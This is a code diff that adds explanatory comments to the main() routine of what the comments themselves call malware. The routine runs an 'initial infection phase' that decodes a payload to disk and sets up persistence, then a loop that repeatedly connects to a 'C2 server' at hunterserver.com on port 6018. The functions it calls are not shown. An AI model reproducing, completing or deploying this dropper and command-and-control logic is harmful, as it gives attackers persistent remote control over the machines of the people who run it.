@@ -74,19 +74,26 @@ def run(host, port):
 
 
 def main():
+    # Determine system path based on OS
     system_path = "C:\\ProgramData\\" if sys.platform == "win32" else "/usr/local/bin/"
 
+    # Check if we're running from system directory
     if Path(os.getcwd()) != Path(system_path):
-        extract_encoded()
-        makehidden()
+        # Initial infection phase
+        extract_encoded() # Decode and write payload to disk
+        makehidden() # Set up persistence mechanism
     else:
+        # Persistent operation phase
         while True:
             try:
+                # Connect to C2 server (replace with your actual connection function)
                 run(host="hunterserver.com", port=6018)
+                # Sleep interval between connection attempts
                 time.sleep(30)
             except Exception as e:
+                # Error handling for connection failures
                 print(f"Connection error: {e}")
-                time.sleep(30)
+                time.sleep(30) # Retry after same interval
 
 
 # if "__main__" == __name__:
